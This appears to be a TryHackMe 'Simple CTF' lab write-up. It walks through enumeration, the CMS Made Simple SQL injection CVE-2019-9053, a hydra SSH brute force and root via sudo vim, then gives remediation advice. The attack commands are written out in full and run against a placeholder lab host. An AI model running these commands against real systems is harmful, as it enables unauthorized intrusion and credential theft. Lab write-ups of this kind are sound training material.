# TryHackMe – Simple CTF

**Room:** Simple CTF  
**Author:** Luis (Anub1t)  
**Date:** 2025‑09‑12

---

## Overview

In this TryHackMe room, the objective is to compromise a Linux host by:

- Enumerating exposed services.
- Identifying a vulnerable web application (CMS Made Simple 2.2.8).
- Exploiting a SQL injection vulnerability (**CVE‑2019‑9053**) to obtain credentials.
- Using SSH access on a non‑standard port.
- Escalating privileges to root via misconfigured `sudo` permissions.

The room is rated **easy**, but it covers the full attack chain: recon → web exploitation → credential extraction → SSH → privilege escalation.

---

## Reconnaissance

### Port scan

I started with a TCP scan on the lower ports to answer how many services are running under port 1000:

```bash
nmap -p1-1000 <TARGET_IP>
```

The scan showed that **2 services** are running below TCP port 1000.

Then I ran a full port scan to identify all open ports:

```bash
nmap -T4 -p- <TARGET_IP>
```

This revealed, among others, the following relevant ports:

- `80/tcp` – HTTP  
- `2222/tcp` – SSH (non‑standard port)

The highest open port in this context is **2222/tcp**, running **SSH**.

---

## Web enumeration

I browsed the HTTP service:

```text
http://<TARGET_IP>/
```

The default page didn’t immediately expose an obvious vulnerability, so I performed directory brute forcing to discover hidden content:

```bash
dirsearch -u http://<TARGET_IP>/
# or
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

The scan revealed an interesting directory:

- `/simple`

Visiting `http://<TARGET_IP>/simple/` showed a website with a footer that exposed:

- **Application:** CMS Made Simple  
- **Version:** 2.2.8

---

## Vulnerability identification (CVE‑2019‑9053)

With the product and version identified, I searched for known vulnerabilities:

- Query: `CMS Made Simple 2.2.8 CVE` / `CMS Made Simple 2.2.8 SQL injection`.

Public advisories and databases (NVD, Exploit‑DB, etc.) indicate that:

- **CVE:** `CVE‑2019‑9053`  
- **Description:** Unauthenticated blind time‑based SQL injection in CMS Made Simple 2.2.8 via the `m1_idlist` parameter in the News module. [web:70][web:75][web:78][web:79]  
- **Impact:** Allows an attacker to execute arbitrary SQL queries against the application database and retrieve sensitive information such as admin username, email, salt and hashed password. [web:71][web:73][web:77]

The vulnerability type is therefore: **SQL Injection (SQLi)**.

---

## Exploitation – Extracting credentials

To exploit this SQL injection, I used a publicly available Python exploit for **CVE‑2019‑9053** (for example, Exploit‑DB ID 46635 or a GitHub fork):

```bash
pip3 install httpx termcolor   # if required by the script

python3 exploit.py -u "http://<TARGET_IP>/simple/"
# optionally with cracking:
# python3 exploit.py -u "http://<TARGET_IP>/simple/" --crack -w /usr/share/wordlists/rockyou.txt
```

The exploit:

1. Sends crafted SQLi payloads via the vulnerable parameter.
2. Extracts the admin **username**, **email**, **salt** and **hashed password**.
3. Optionally attempts to crack the password using a supplied wordlist. [web:73][web:77][web:80]

From the exploit output, I obtained:

- **Username:** `mitch`  
- **Password hash:** extracted by the script  
- After cracking (either via the exploit itself or manually using `rockyou.txt`), the clear‑text password was:

- **Password:** `secret`

*(The exact password is kept for educational purposes; in a real report you could generalize it as “weak, wordlist‑crackable password”.)*

---

## SSH access

With valid credentials, I targeted the SSH service running on port 2222.

As an alternative to the built‑in cracking feature, I also demonstrated a manual password attack using `hydra`:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 -f -V ssh://<TARGET_IP>
```

Once the password was obtained, I logged in:

```bash
ssh -p 2222 mitch@<TARGET_IP>
# password: secret
```

This provided an interactive shell as the user `mitch`.

---

## Post‑exploitation – User flag

After logging in:

```bash
ls
cat user.txt
```

The file `user.txt` contained the user flag:

- `G00d j0b, keep up!` (REDACTED)

This confirms control of the low‑privilege user account.

---

## Post‑exploitation – Privilege escalation

### Enumerating users

From the SSH session:

```bash
cd /home
ls
```

I observed two user directories:

- `mitch`  
- `sunbath`

This indicates another local user account present on the system.

### Checking sudo permissions

To look for privilege escalation vectors, I checked `sudo` permissions:

```bash
sudo -l -l
```

The output showed that `mitch` can run `vim` as root without providing a password:

```text
(ALL : ALL) NOPASSWD: /usr/bin/vim
```

This can be abused to spawn a root shell.

---

## Gaining a root shell

Using the allowed `sudo` command:

```bash
sudo /usr/bin/vim -c ':!bash' -c ':q'
# or
# sudo vim -c ':!/bin/sh'
```

This launches a shell as `root`.

Then:

```bash
cd /root
ls
cat root.txt
```

The file `root.txt` contained the root flag:

- `W3ll d0n3. You made it!` (REDACTED)

This confirms full compromise of the system.

---

## Impact and remediation

**Impact:**

- The CMS Made Simple instance is vulnerable to unauthenticated SQL injection (**CVE‑2019‑9053**), allowing an attacker to extract credentials from the database and compromise the admin account. [web:70][web:75][web:78][web:79]  
- Weak/reused passwords make it trivial to reuse those credentials over SSH and gain shell access. [web:71][web:73]  
- Misconfigured `sudo` (NOPASSWD for `vim`) allows any attacker with `mitch`’s credentials to escalate directly to root and fully control the host.

**Recommended remediation:**

- Update CMS Made Simple to a version where CVE‑2019‑9053 is patched (≥ 2.2.10). [web:75][web:78]  
- Sanitize and validate all user input, avoiding direct concatenation in SQL queries (use prepared statements/ORM). [web:81]  
- Enforce strong, unique passwords for all accounts and disable password reuse across services.  
- Review and harden `sudoers` configuration, removing NOPASSWD entries for interactive editors like `vim`.  
- Restrict SSH access (IP allowlists, keys instead of passwords, disable non‑standard ports unless justified).

---

## Notes

This room is a good example of how a single web vulnerability (SQL injection) can quickly escalate into full system compromise when combined with weak credentials and misconfigured privilege escalation paths.

---

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Do not use these techniques outside of authorized environments or in violation of TryHackMe’s terms of service.
